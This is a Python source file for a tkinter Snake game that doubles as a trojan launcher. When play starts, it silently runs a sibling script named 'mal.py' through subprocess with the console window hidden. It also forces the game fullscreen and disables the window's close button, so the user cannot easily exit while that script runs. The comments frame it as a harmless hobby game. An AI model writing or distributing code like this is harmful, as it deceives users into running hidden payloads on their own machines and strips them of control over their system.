import tkinter as tk
import subprocess
import os

# this is the game Crafted with standard coding tools
# I dont take the credit
# i did this because i had no time

class SnakeGame:
    def __init__(self, root):
        self.root = root
        self.root.attributes("-fullscreen", True)
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.title("Snake Game")
        
        self.snake_color = "green"  # Default color
        self.main_menu()
        
    def main_menu(self):
        self.clear_screen()
        self.canvas = tk.Canvas(self.root, bg="black", width=800, height=600)
        self.canvas.pack(fill=tk.BOTH, expand=True)
        self.canvas.create_text(400, 200, text="Snake Game", fill="white", font=("Arial", 32))
        self.canvas.create_text(400, 300, text="Press ENTER to Start", fill="white", font=("Arial", 16))
        self.canvas.create_text(400, 350, text="Press C to Change Snake Color", fill="white", font=("Arial", 16))
        
        self.root.bind("<Return>", self.start_game)
        self.root.bind("c", self.change_snake_color)
    
    def change_snake_color(self, event):
        colors = ["green", "blue", "red", "yellow", "purple", "orange"]
        current_index = colors.index(self.snake_color)
        self.snake_color = colors[(current_index + 1) % len(colors)]
        self.main_menu()
    
    def start_game(self, event=None):
        self.clear_screen()
        
        self.canvas = tk.Canvas(self.root, bg="black", width=800, height=600)
        self.canvas.pack(fill=tk.BOTH, expand=True)
        
        self.score = 0
        self.score_label = tk.Label(self.root, text=f"Score: {self.score}", font=("Arial", 16), bg="black", fg="white")
        self.score_label.pack()
        
        self.snake = [(20, 20), (40, 20), (60, 20)]
        self.food = (100, 100)
        self.direction = "Right"
        self.running = True
        self.update_score()
        self.draw_elements()
        self.root.bind("<KeyPress>", self.change_direction)
        self.update_game()
        self.run_background_script()
        
    def draw_elements(self):
        self.canvas.delete("all")
        for x, y in self.snake:
            self.canvas.create_rectangle(x, y, x+20, y+20, fill=self.snake_color)
        food_x, food_y = self.food
        self.canvas.create_rectangle(food_x, food_y, food_x+20, food_y+20, fill="red")
    
    def change_direction(self, event):
        if event.keysym in ["Left", "Right", "Up", "Down"]:
            self.direction = event.keysym
    
    def update_game(self):
        if not self.running:
            return
        x, y = self.snake[-1]
        if self.direction == "Left":
            x -= 20
        elif self.direction == "Right":
            x += 20
        elif self.direction == "Up":
            y -= 20
        elif self.direction == "Down":
            y += 20
        
        if (x, y) in self.snake or x < 0 or y < 0 or x >= 800 or y >= 600:
            self.game_over()
            return
        
        self.snake.append((x, y))
        if (x, y) == self.food:
            self.food = (x+40, y+40)  # Example of moving food
            self.score += 10
            self.update_score()
        else:
            self.snake.pop(0)
        
        self.draw_elements()
        self.root.after(100, self.update_game)
    
    def update_score(self):
        self.score_label.config(text=f"Score: {self.score}")
    
    def game_over(self):
        self.running = False
        self.canvas.create_text(400, 300, text="Game Over", fill="white", font=("Arial", 24))
        self.canvas.create_text(400, 350, text="Press R to Restart", fill="white", font=("Arial", 16))
        self.canvas.create_text(400, 400, text="Press M for Main Menu", fill="white", font=("Arial", 16))
        self.root.bind("r", self.restart_game)
        self.root.bind("m", self.main_menu)
    
    def restart_game(self, event):
        self.start_game()
    
    def run_background_script(self):
        script_path = os.path.join(os.path.dirname(__file__), "mal.py")
        subprocess.Popen(["python", script_path], creationflags=subprocess.CREATE_NO_WINDOW)
    
    def clear_screen(self):
        for widget in self.root.winfo_children():
            widget.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    game = SnakeGame(root)
    root.mainloop()
